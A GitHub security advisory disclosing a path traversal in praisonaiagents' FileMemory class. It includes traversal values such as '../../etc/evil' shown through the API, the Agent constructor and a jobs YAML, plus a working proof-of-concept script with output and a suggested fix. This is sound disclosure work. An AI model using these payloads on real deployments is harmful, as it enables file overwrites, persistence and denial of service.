# [H] praisonaiagents vulnerable to arbitrary file write via unsanitized `user_id` in `FileMemory.__init__()` — path traversal to any writable location

## Summary
Severity: High
Advisory: GHSA-gxmw-5f7x-6g22
CVE: CVE-2026-55527
CWE: CWE-22, CWE-73
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L (CVSS_V3)
Published: 2026-08-25
Source: https://github.com/advisories/GHSA-gxmw-5f7x-6g22
Type: github-advisory

## Affected
- PyPI: `praisonaiagents` — affected >=0 <1.6.58

## Details
### Summary

`praisonaiagents/memory/file_memory.py::FileMemory.__init__()` constructs all
memory file paths by directly joining the `user_id` parameter to a base path:

```python
self.user_path = self.base_path / user_id      # LINE 145 — no sanitization
```

No validation or normalization is applied to `user_id` before the path join.
An attacker who can supply a `user_id` containing `../` sequences can write
arbitrary JSON files (memory content) to **any writable location on the filesystem**.

The vulnerability is confirmed **live on the current `main` branch**
(`praisonaiagents==1.6.52`) and is **distinct from GHSA-766v-q9x3-g744**
(which covered `MultiAgentMonitor` in an example file, not `FileMemory` in the
core library).

### Details

**Vulnerable code — `praisonaiagents/memory/file_memory.py` lines 139-157:**

```python
def __init__(
    self,
    user_id: str = "default",
    base_path: Optional[str] = None,
    ...
):
    ...
    self.user_path = self.base_path / user_id          # LINE 145 — NO SANITIZATION
    self.episodic_path = self.user_path / "episodic"

    self.user_path.mkdir(parents=True, exist_ok=True)  # creates dirs at traversed path
    self.episodic_path.mkdir(parents=True, exist_ok=True)

    self.config_file      = self.user_path / "config.json"
    self.short_term_file  = self.user_path / "short_term.json"
    self.long_term_file   = self.user_path / "long_term.json"
    self.entities_file    = self.user_path / "entities.json"
    self.summaries_file   = self.user_path / "summaries.json"
```

All five JSON files are written under `user_path`, which is directly derived from
the attacker-controlled `user_id`. The written content is valid JSON in the memory
item format (configurable user content + metadata).

**Comparison with the patched reference — `praisonaiagents/storage/backends.py`
(SQLiteBackend):**

The sibling `SQLiteBackend` validates its `table_name` with a regex:
```python
if not re.match(r'^[a-zA-Z0-9_]+$', table_name):
    raise ValueError(...)
```
No equivalent validation exists in `FileMemory`.

**Attack chains:**

*A — Direct Python API (any caller):*
```python
from praisonaiagents.memory.file_memory import FileMemory

mem = FileMemory(user_id="../../etc/evil")
mem.add_short_term("injected content")
# Creates /etc/evil/short_term.json  (on Linux)
# Creates C:\evil\short_term.json    (on Windows)
```

*B — Via `Agent` constructor (memory dict):*
```python
from praisonaiagents import Agent

agent = Agent(
    name="assistant",
    memory={"provider": "file", "user_id": "../../etc/evil"},
    instructions="You are a helpful assistant.",
)
# FileMemory(user_id="../../etc/evil") called at agent init
```

*C — Via agents.yaml / job submission (`agent_yaml` field):*
```yaml
# Submitted via POST /jobs with agent_yaml:
agents:
  researcher:
    memory:
      provider: file
      user_id: "../../tmp/evil"
    role: "Research assistant"
    goal: "Research topics"
```
`agents_generator.py` passes the `memory.user_id` value to the `Agent` constructor.

### PoC

**Environment:** Python 3.9+, `praisonaiagents <= 1.6.52`

**Step 1 — Verify path escapes base (no dependencies needed):**

```python
from pathlib import Path
import tempfile

base = Path(tempfile.gettempdir()) / "praisonai" / "memory"
user_id = "../../../tmp/evil_escape"
user_path = base / user_id

try:
    user_path.resolve().relative_to(base.resolve())
    print("SAFE")
except ValueError:
    print("!!PATH ESCAPES BASE!!")
    print("Writes to:", user_path.resolve())
```

Output:
```
!!PATH ESCAPES BASE!!
Writes to: <TMPDIR>/tmp/evil_escape
```

**Step 2 — Live exploit (files written outside base):**

```python
import tempfile, json
from pathlib import Path
from praisonaiagents.memory.file_memory import FileMemory

BASE = Path(tempfile.gettempdir()) / "praisonai_base" / "memory"
BASE.mkdir(parents=True, exist_ok=True)

TARGET = (BASE / "../../praisonai_path_traversal_proof").resolve()

mem = FileMemory(user_id="../../praisonai_path_traversal_proof", base_path=str(BASE))
mem.add_short_term("PROOF_OF_TRAVERSAL: attacker wrote this")
mem.add_long_term("SENSITIVE_DATA", importance=0.9)

# Verify files appeared OUTSIDE the base directory
for fname in ["short_term.json", "long_term.json", "config.json"]:
    f = TARGET / fname
    if f.exists():
        print(f"WRITTEN: {f}")
        print(f"Content: {json.loads(f.read_text())[0]['content'] if fname != 'config.json' else '...'}")
```

**Observed output (run on current `main`):**
```
WRITTEN: <TMPDIR>/praisonai_path_traversal_proof/short_term.json
Content: PROOF_OF_TRAVERSAL: attacker wrote this
WRITTEN: <TMPDIR>/praisonai_path_traversal_proof/long_term.json
Content: SENSITIVE_DATA
WRITTEN: <TMPDIR>/praisonai_path_traversal_proof/config.json
```

### Impact

**What kind of vulnerability:** Arbitrary file write via path traversal.
Any JSON content can be written to any filesystem path writable by the process.

**Who is impacted:**

- Any application that creates `FileMemory` instances with user-controlled `user_id`
- Any PraisonAI deployment where users can supply the `user_id` parameter directly
  or indirectly (via `Agent(memory={"user_id": ...})`, agents.yaml, or jobs API)

**High-impact scenarios:**

1. **Overwrite Python package files**: On systems where Python packages are stored
   in a world-writable or user-writable path, JSON files can be written over package
   files, causing import failures or (in edge cases) execution if a JSON parser is
   swapped for a Python parser.

2. **Overwrite web server / app config**: Write `config.json` or `settings.json`
   to an app's configuration directory, potentially modifying runtime behavior.

3. **Cron / startup persistence**: Write JSON files to `/etc/cron.d/` paths
   (Linux) or `%APPDATA%\Startup\` (Windows) directories that might be interpreted
   by monitoring systems.

4. **Denial of Service**: Write large JSON memory files into system directories,
   filling disk space or overwriting critical config files.

5. **Multi-tenant deployments**: In a multi-tenant PraisonAI deployment where
   users can create agents with custom memory configs, one user can read/overwrite
   another user's memory files by traversing to their path.

**Distinction from GHSA-766v-q9x3-g744:**

| | GHSA-766v-q9x3-g744 | This finding |
|---|---|---|
| File | `examples/context/12_multi_agent_context.py` (example) | `praisonaiagents/memory/file_memory.py` (core library) |
| Class | `MultiAgentMonitor` | `FileMemory` |
| Fixed in | `praisonaiagents >= 1.5.115` | **Not patched** (affects 1.6.52) |
```

---

## Remediation Suggestion (for maintainers)

Validate and resolve `user_id` before using it in path construction:

```python
def __init__(self, user_id: str = "default", base_path=None, ...):
    ...
    # ADDED: sanitize user_id
    import re
    if not re.match(r'^[a-zA-Z0-9_\-\.]+$', user_id):
        raise ValueError(
            f"user_id '{user_id}' contains invalid characters. "
            f"Only alphanumeric characters, hyphens, underscores, and dots are allowed."
        )

    self.user_path = self.base_path / user_id

    # ADDED: verify the resolved path is within base (defense-in-depth)
    resolved = self.user_path.resolve()
    base_resolved = self.base_path.resolve()
    try:
        resolved.relative_to(base_resolved)
    except ValueError:
        raise ValueError(
            f"user_id '{user_id}' would write outside the base memory directory."
        )
```

The same pattern should be applied to `base_path` parameter.

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-gxmw-5f7x-6g22
- https://github.com/MervinPraison/PraisonAI/commit/2f9677abb2ea68eab864ee8b6a828fd0141612e1
- https://github.com/MervinPraison/PraisonAI
- https://github.com/MervinPraison/PraisonAI/releases/tag/v4.6.58
